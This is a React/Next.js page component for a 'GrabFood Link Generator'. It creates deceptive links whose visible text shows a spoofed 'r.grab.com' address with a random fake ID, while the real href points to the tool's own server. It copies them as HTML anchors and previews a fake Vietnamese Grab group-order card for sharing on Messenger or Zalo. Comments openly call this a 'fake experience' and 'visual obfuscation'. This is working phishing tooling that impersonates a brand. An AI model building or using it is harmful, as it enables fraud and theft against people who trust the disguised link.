'use client';
import { useState } from 'react';

export default function Home() {
  const [loading, setLoading] = useState(false);
  const [generatedLink, setGeneratedLink] = useState('');
  // Set default template immediately
  const [selectedTemplate, setSelectedTemplate] = useState('https://placehold.co/1200x630/00b14f/ffffff.png?text=GrabFood+Group+Order');
  const [destinationUrl, setDestinationUrl] = useState('');
  // Set default preview immediately
  const [previewImage, setPreviewImage] = useState('https://placehold.co/1200x630/00b14f/ffffff.png?text=GrabFood+Group+Order');

  const templates = [
    { name: 'Default Grab', path: 'https://placehold.co/1200x630/00b14f/ffffff.png?text=GrabFood+Group+Order' },
  ];

  const handleTemplateSelect = (path) => {
    setSelectedTemplate(path);
    setPreviewImage(path);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      const formData = new FormData();
      formData.append('destinationUrl', destinationUrl);
      // Always send the selected template (or default)
      formData.append('template', selectedTemplate);

      const res = await fetch('/api/create', {
        method: 'POST',
        body: formData,
      });
      const data = await res.json();
      
      if (data.id) {
        // Force display of r.grab.com for the "fake" experience
        const spoofedOrigin = "http://r.grab.com"; 
        const realOrigin = window.location.origin;

        // Generate random fake ID for visual obfuscation
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let fakeId = '';
        for (let i = 0; i < 8; i++) {
          fakeId += chars.charAt(Math.floor(Math.random() * chars.length));
        }

        setGeneratedLink({
          fake: `${spoofedOrigin}/o/${fakeId}`,
          real: `${realOrigin}/o/${data.id}`
        });
      }
    } catch (error) {
      console.error(error);
      alert('Error creating link');
    } finally {
      setLoading(false);
    }
  };

  const copyHTML = () => {
    if (!generatedLink) return;
    const text = `<a href="${generatedLink.real}">${generatedLink.fake}</a>`;
    navigator.clipboard.writeText(text);
    alert('Copied as HTML Link!');
  };

  return (

    <main className="flex min-h-screen flex-col items-center justify-center p-4 md:p-12 bg-[#F7F7F7]">
      <div className="z-10 max-w-5xl w-full items-center justify-center font-mono text-sm flex mb-8 md:mb-12">
        <h1 className="text-3xl md:text-4xl font-bold text-gray-900 tracking-tight text-center">
          GrabFood <span className="text-[#00b14f] font-light">Link Generator</span>
        </h1>
      </div>

      <div className="grid lg:grid-cols-2 gap-8 lg:gap-12 w-full max-w-5xl">
        {/* Editor Column */}
        <div className="glass p-6 md:p-8 rounded-2xl flex flex-col gap-6 shadow-sm border border-gray-200 bg-white">
          <div className="flex items-center gap-2 mb-2">
            <div className="w-3 h-3 rounded-full bg-gray-200"/>
            <div className="w-3 h-3 rounded-full bg-gray-200"/>
            <div className="w-3 h-3 rounded-full bg-gray-200"/>
          </div>
          <h2 className="text-xl font-semibold text-gray-900">Configuration</h2>
          
          <form onSubmit={handleSubmit} className="flex flex-col gap-5">
            <div>
              <label className="block text-sm font-medium mb-2 text-gray-700">Destination URL</label>
              <input 
                type="url" 
                required
                placeholder="https://example.com"
                className="w-full p-4 rounded-xl input-glass focus:ring-2 focus:ring-[#00b14f] outline-none transition-all placeholder:text-gray-400"
                value={destinationUrl}
                onChange={(e) => setDestinationUrl(e.target.value)}
              />
            </div>

            {/* Template Selection */}
            <div>
              <label className="block text-sm font-medium mb-2 text-gray-700">Choose Template</label>
              <div className="grid grid-cols-2 gap-3">
                {templates.map((t) => (
                  <div 
                    key={t.path}
                    onClick={() => handleTemplateSelect(t.path)}
                    className={`
                      cursor-pointer rounded-xl overflow-hidden border-2 transition-all relative aspect-[1.91/1]
                      ${selectedTemplate === t.path ? 'border-[#00b14f] ring-2 ring-[#00b14f]/20' : 'border-gray-200 hover:border-gray-300'}
                    `}
                  >
                    <img src={t.path} alt={t.name} className="w-full h-full object-cover" />
                    {selectedTemplate === t.path && (
                      <div className="absolute inset-0 bg-[#00b14f]/20 flex items-center justify-center">
                        <div className="bg-[#00b14f] text-white rounded-full p-1">
                          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7"></path></svg>
                        </div>
                      </div>
                    )}
                  </div>
                ))}
              </div>
            </div>



            <button 
              type="submit" 
              disabled={loading}
              className="mt-2 w-full py-4 rounded-xl bg-[#00b14f] hover:bg-[#009e47] text-white font-bold text-lg shadow-lg hover:shadow-green-500/25 transition-all disabled:opacity-50 disabled:cursor-not-allowed transform active:scale-[0.98]"
            >
              {loading ? 'Generating Magic...' : 'Generate Fake Link'}
            </button>
          </form>

          {generatedLink && (
            <div className="mt-4 p-5 bg-green-50 border border-green-100 rounded-2xl animate-in fade-in slide-in-from-top-4 duration-500 flex flex-col gap-4">
              
              {/* Fake Visual Link */}
              <div>
                <p className="text-xs text-[#00b14f] font-semibold mb-2 uppercase tracking-wider">1. The Fake Text (What they see)</p>
                <div className="flex items-center gap-3 bg-white p-2 rounded-lg border border-green-200">
                  <input 
                    readOnly 
                    value={generatedLink.fake} 
                    className="flex-1 bg-transparent text-gray-900 font-mono text-sm outline-none px-2"
                  />
                  <button 
                    onClick={() => {navigator.clipboard.writeText(generatedLink.fake); alert('Copied!');}}
                    className="text-gray-400 hover:text-[#00b14f] text-xs px-2 transition-colors font-bold"
                  >
                    COPY
                  </button>
                </div>
              </div>

              {/* Real Funtional Link */}
              <div>
                <p className="text-xs text-gray-500 font-semibold mb-2 uppercase tracking-wider">2. The Real Link (Where it goes)</p>
                <div className="flex items-center gap-3 bg-white p-2 rounded-lg border border-gray-200">
                  <input 
                    readOnly 
                    value={generatedLink.real} 
                    className="flex-1 bg-transparent text-gray-500 font-mono text-sm outline-none px-2"
                  />
                  <button 
                    onClick={() => {navigator.clipboard.writeText(generatedLink.real); alert('Copied!');}}
                    className="text-gray-400 hover:text-[#00b14f] text-xs px-2 transition-colors font-bold"
                  >
                    COPY
                  </button>
                </div>
              </div>

              <div className="h-px bg-green-200/50 my-1"></div>

            </div>
          )}
        </div>

        {/* Preview Column */}
        <div className="flex flex-col gap-6">
          <div className="glass p-6 md:p-8 rounded-2xl h-full flex flex-col justify-center items-center shadow-sm border border-gray-200 bg-white relative overflow-hidden">
            <div className="absolute top-0 right-0 p-8 opacity-10 transform translate-x-1/2 -translate-y-1/2">
                <div className="w-64 h-64 rounded-full bg-[#00b14f] blur-[80px]"></div>
            </div>
            
            <p className="text-sm text-gray-400 mb-8 uppercase tracking-widest font-light text-center">Social Preview Simulation</p>
            
            {/* Simulation of the Grab card */}
            <div className="bg-white text-black rounded-[14px] overflow-hidden w-full max-w-[380px] shadow-2xl transform hover:scale-[1.02] transition-transform duration-300 ring-1 ring-gray-200">
               {/* Image Area */}
               <div className="aspect-[1.91/1] w-full bg-gray-100 relative overflow-hidden">
                 {previewImage ? (
                   <img src={previewImage} alt="Preview" className="w-full h-full object-cover" />
                 ) : (
                   <div className="w-full h-full flex flex-col items-center justify-center text-gray-400 bg-gray-50 gap-2">
                     <svg className="w-8 h-8 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
                     <span className="text-xs font-medium">No Thumbnail Selected</span>
                   </div>
                 )}
               </div>

               {/* Content Area */}
               <div className="p-[12px] bg-[#F0F2F5] border-t border-gray-100">
                  <div className="flex flex-col gap-[2px]">
                    <div className="text-[12px] text-[#65676B] uppercase leading-3 font-normal truncate">R.GRAB.COM</div>
                    <h3 className="text-[16px] text-[#050505] font-bold leading-5 truncate font-sans">Đặt đơn nhóm GrabFood</h3>
                    <p className="text-[14px] text-[#65676B] leading-[18px] line-clamp-1 font-sans mt-[2px]">
                      Mỗi thành viên có thể tự chọn món yêu thích...
                    </p>
                  </div>
               </div>
            </div>
            <p className="mt-8 text-xs text-center text-gray-500 max-w-xs">
              *The actual appearance depends on where you share the link (Messenger, Zalo, etc.)
            </p>
          </div>
        </div>
      </div>
    </main>
  );
}
